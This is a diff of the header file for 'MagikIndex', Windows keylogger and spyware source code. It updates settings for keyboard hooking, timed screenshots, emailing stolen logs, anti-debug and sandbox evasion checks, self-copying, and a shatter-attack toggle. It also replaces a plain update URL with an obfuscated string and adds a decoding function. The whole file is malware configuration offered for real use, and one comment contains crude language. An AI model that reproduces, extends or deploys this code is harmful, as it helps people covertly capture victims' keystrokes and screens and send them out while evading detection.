@@ -29,9 +29,13 @@
 #include <winioctl.h>
 #include <shlwapi.h>
 #include <lm.h>
+#include <psapi.h>
+#include <thread>
+
 
 #include "Antidbg.h"
 #include "log.h"
+#include "lz4\lz4.h"
 #include "base64.h"
 
 using buffer = std::vector<char>;
@@ -41,16 +45,16 @@ using buffer = std::vector<char>;
 
 #define CryptLogs true      //whether or not to crypt files
 #define KeyShiftLimit 122   //cap for the highest possible random encryption key
-#define ShatterAttack false //disable or enable shatter attacks on sys utils(cmd,Run,Taskmgmr)
+#define ShatterAttack false //disable or enable shatter attacks on sys utils(cmd,Run,Taskmgmr)  KEEP DISABLED IN REALWORLD USAGE
 #define IsMajor true        //let the program know whether its a Dev build or not
-#define CurrentVersion "1.7"//current version number
-#define GitVersionLink "https://raw.githubusercontent.com/brat-volk/MagikIndex/main/MagikVersion.inf"//link to GitHub Raw server containing up-to-date version file
-#define CharactersPerLog 500
+#define CurrentVersion "1.8"//current version number
+#define GitVersionLink "i\\wnoNw;Yc|LZ\\YvYcpHYVx6Ycj34N6XI\\wn2crfY[P;{cu;ofvSZ[{L4Nv;4[wSpdnTpdxPoenPZfkXJc2n4\\weZ[{;{N8OJe2TJc"//link to GitHub Raw server containing up-to-date version file
+#define CharactersPerLog 400
 #define MaximumFolderSize 10//limit of MagikIndex copies in a system
 #define RequiredRam 2048    //MB                                             (anti-dbg feature)
 #define RequiredCores 2     //                                               (anti-dbg feature)
 #define SecondsBetweenScreenshots 20
-#define ScreenGrab true     //whether to screenshot at set intervals or not
+#define ScreenGrab false     //whether to screenshot at set intervals or not
 #define ScreenshotsPerZip 15
 #define SendersEmail ""
 #define SendersPsw ""             //IMPORTANT : due to google's cuckhold fetish the "Allow less secure apps" setting has now been removed, you are now required to enable 2-step auth and create an "App Password" for Mail. use the password provided by google in this field.
@@ -59,7 +63,7 @@ using buffer = std::vector<char>;
 #define MinRequiredApps 20  //minimum amount of installed programs           (anti-dbg feature)
 #define SecurityLevel 3     //0-3 levels of trust towards environment        (anti-dbg feature)
 #define MinHardDisk 60      //minimum size for the main partition(GB)        (anti-dbg feature)
-#define DelayExecution true //whether or not execution should be delayed     (anti-dbg feature)
+#define DelayExecution false//whether or not execution should be delayed     (anti-dbg feature)
 #define DelayTime 300       //amount of time for the delay (seconds)         (anti-dbg feature)
 #define QuitIfUntrust false //should we send a log if the environment is untrusted or quit on the spot?
 
@@ -94,10 +98,12 @@ std::string GetCpuInfo();
 BOOL SaveHBITMAPToFile(HBITMAP hBitmap, LPCTSTR lpszFileName);
 ULONG WINAPI ScreenGrabber(LPVOID Parameter);
 void TakeScreenShot(const char* filename);
-bool fexists(std::string filename);                          //create native check through CreateFileA()
+BOOL fexists(std::string filename);                          //create native check through CreateFileA()
 void FinalExit();
 //void Compress(const buffer& in, buffer& out);
 LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
+std::string HardDecode(std::string EncodedString);
+int Hooker();
 
 
 
